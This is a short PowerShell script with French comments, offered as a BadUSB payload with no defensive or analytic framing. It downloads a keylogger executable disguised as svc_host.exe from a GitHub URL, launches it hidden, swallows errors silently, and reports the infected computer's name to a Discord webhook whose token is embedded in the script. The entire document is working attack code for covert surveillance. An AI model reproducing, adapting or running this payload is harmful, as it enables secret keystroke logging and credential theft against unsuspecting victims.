# Payload pour BadUSB – Télécharge et exécute ton keylogger (version 2025)
# Utilise ton webhook Discord pour les logs

$webhookUrl = "https://discord.com/api/webhooks/1318280027363606589/FkAnJDBzgFUo3A7YeocKsc8PbojYTWuE0-_BTNn7SunjxTokeWNOVpHk_dN9Uh5XqrOW"  # Ton webhook

# Télécharge ton exe keylogger (remplace par ton lien GitHub ou un hébergeur comme Dropbox/Mega)
$uri = "https://raw.githubusercontent.com/ton-repo/keylogger/main/svc_host.exe"  # Upload ton exe de 11 Mo dans un autre repo GitHub
$path = "$env:TEMP\svc_host.exe"

try {
    Invoke-WebRequest -Uri $uri -OutFile $path -UseBasicParsing
    Start-Process $path -WindowStyle Hidden  # Lance en caché
} catch {
    # Erreur silencieuse
}

# Envoi d'un log de démarrage sur Discord (optionnel)
$logMessage = @{
    content = "BadUSB déclenché sur $env:COMPUTERNAME - Keylogger installé"
} | ConvertTo-Json
Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $logMessage -ContentType 'application/json'
